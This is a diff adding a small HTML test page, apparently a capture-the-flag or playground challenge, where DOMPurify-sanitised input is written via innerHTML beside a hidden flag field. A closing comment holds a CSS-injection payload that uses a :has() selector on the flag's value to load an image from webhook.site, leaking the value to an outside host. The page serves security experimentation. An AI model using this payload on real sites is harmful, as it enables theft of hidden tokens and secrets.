@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clean af</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.5/purify.min.js"
+        integrity="sha512-/CUtA84sWWqWEBejNrrtWa7Yc4cth3Ome2ymvCKOo9YcZ4sh98tndUy4LutE2xGcAgD4fyz16y+gSyJdGCB5ww=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<body>
+    <h1>Clean af</h1>
+    <input id="untrusted_input" type="text" />
+    <p id="output_text"></p>
+    <div id="output"></div>
+    <input name="flag" value="flag{just_playing_around}" hidden/>
+</body>
+<script>
+    const appendFunc = () => {
+        const untrusted_input = document.getElementById('untrusted_input').value;
+        const sanitized = DOMPurify.sanitize(untrusted_input);
+        document.getElementById("output_text").innerText = sanitized;
+
+        const outputElement = document.getElementById("output");
+        outputElement.innerHTML = sanitized;
+    }
+    document.getElementById('untrusted_input').addEventListener('input', appendFunc);
+</script>
+
+</html>
+
+<!-- <div></div><style>body:has(input[name="flag"][value="flag{just_playing_around}"]){background: url("https://webhook.site/...?hit")}</style> -->
